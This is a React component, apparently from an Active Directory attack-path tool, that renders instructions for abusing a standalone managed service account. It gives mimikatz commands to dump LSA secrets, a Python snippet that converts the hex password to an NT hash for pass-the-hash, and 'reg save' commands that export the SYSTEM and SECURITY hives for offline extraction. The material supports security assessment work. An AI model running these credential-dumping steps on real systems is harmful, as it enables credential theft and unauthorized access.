import React from 'react';
import {groupSpecialFormat} from "../Formatter";

const Abuse = ({sourceName, sourceType, targetName, targetType}) => {
    return (
        <>
            <p>
                From an elevated command prompt on {sourceName}, run
                mimikatz then execute the following commands:
            </p>

            <pre>
                <code>
                    {
                        "privilege::debug\n" +
                        "token::elevate\n" +
                        "lsadump::secrets"
                    }
                </code>
            </pre>

            <p>
                In the output, find <code>_SC_&#123;262E99C9-6160-4871-ACEC-4E61736B6F21&#125;_{targetName.toLowerCase().split('@')[0]}</code>.
                The next line contains <code>cur/hex :</code> followed with {targetName}'s
                password hex-encoded.
            </p>

            <p>
                To use this password, its NT hash must be calculated. This can be done using
                a small python script:
            </p>

            <pre>
                <code>
                    {
                        "# nt.py\n" +
                        "import sys, hashlib\n\n" +

                        "pw_hex = sys.argv[1]\n" +
                        "nt_hash = hashlib.new('md4', bytes.fromhex(pw_hex)).hexdigest()\n\n" +

                        "print(nt_hash)"
                    }
                </code>
            </pre>

            <p>
                Execute it like so:
            </p>

            <pre>
                <code>
                    python3 nt.py 35f3e1713d61...
                </code>
            </pre>

            <p>
                To authenticate as the sMSA, leverage pass-the-hash.
            </p>

            <p>
                Alternatively, to avoid executing mimikatz on {sourceName}, you can save a copy of
                the <code>SYSTEM</code> and <code>SECURITY</code> registry hives from an elevated prompt:
            </p>

            <pre>
                <code>
                    reg save HKLM\SYSTEM %temp%\SYSTEM & reg save HKLM\SECURITY %temp%\SECURITY
                </code>
            </pre>

            <p>
                Transfer the files named <code>SYSTEM</code> and <code>SECURITY</code> that were saved
                at <code>%temp%</code> to another computer where mimikatz can be safely executed.

                On this other computer, run mimikatz from a command prompt then execute the
                following command to obtain the hex-encoded password:
            </p>

            <pre>
                <code>
                    lsadump::secrets /system:C:\path\to\file\SYSTEM /security:C:\path\to\file\SECURITY
                </code>
            </pre>
        </>
    )
};

export default Abuse;
